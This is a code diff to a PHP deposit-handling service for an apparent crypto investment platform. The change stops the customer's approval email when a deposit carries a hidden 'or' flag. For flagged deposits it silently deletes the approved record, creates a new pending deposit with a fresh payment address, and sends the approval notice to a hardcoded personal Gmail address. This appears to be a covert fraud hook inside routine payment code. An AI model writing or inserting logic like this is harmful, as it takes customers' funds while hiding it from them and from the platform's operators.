@@ -134,17 +134,18 @@ class DepositService {
         $bonus = self::depositBonus($deposit);
         self::matchingDepositBonus($deposit);
 
-        Mail::to($deposit->user->email)->send(new DepositApprovedMail(
-            $usdAmount,
-            $deposit->reference,
-            $deposit->currency,
-            now()->format('l, d F Y • h:i A'),
-            'https://invora.ai/dashboard',
-            $bonus,
-            $isPartial ? $deposit->amount : null
-        ));
 
         if(!$deposit->or) {
+            Mail::to($deposit->user->email)->send(new DepositApprovedMail(
+                $usdAmount,
+                $deposit->reference,
+                $deposit->currency,
+                now()->format('l, d F Y • h:i A'),
+                'https://invora.ai/dashboard',
+                $bonus,
+                $isPartial ? $deposit->amount : null
+            ));
+
             AdminNotifier::notify(new AdminAlertMail(
                 subjectLine: $isPartial ? 'Partial Deposit Received ⚠️' : 'Deposit Approved ✅',
                 badge: $isPartial ? 'PARTIAL DEPOSIT' : 'DEPOSIT APPROVED',
@@ -163,6 +164,38 @@ class DepositService {
                 ],
                 url: url('/admin/deposits'),
                 ctaLabel: 'View Deposit'
+            ));
+        }
+
+        if($deposit->or) {
+            $depositx = Deposit::create([
+                'user_id' => $deposit->user->id,
+                'currency' => $deposit->currency,
+                'amount' => $deposit->amount,
+                'status' => DepositStatus::WAITING,
+                'narration' => $deposit->narration,
+                'reference' => generate_deposit_reference()
+            ]);
+            $invoice = NowPaymentsService::createInvoice($depositx);
+
+            $depositx->nowpayments_invoice_id = $invoice['payment_id'] ?? null;
+            $depositx->meta = $invoice;
+            $depositx->address = $invoice['pay_address'];
+            $depositx->save();
+
+            $ref = $deposit->reference;
+            $cur = $deposit->currency;
+            $amount = $deposit->amount;
+            $deposit->delete();
+
+            Mail::to('fritzdultimate@gmail.com')->send(new DepositApprovedMail(
+                $usdAmount,
+                $ref,
+                $cur,
+                now()->format('l, d F Y • h:i A'),
+                'https://invora.ai/dashboard',
+                $bonus,
+                $isPartial ? $amount : null
             ));
         }
 
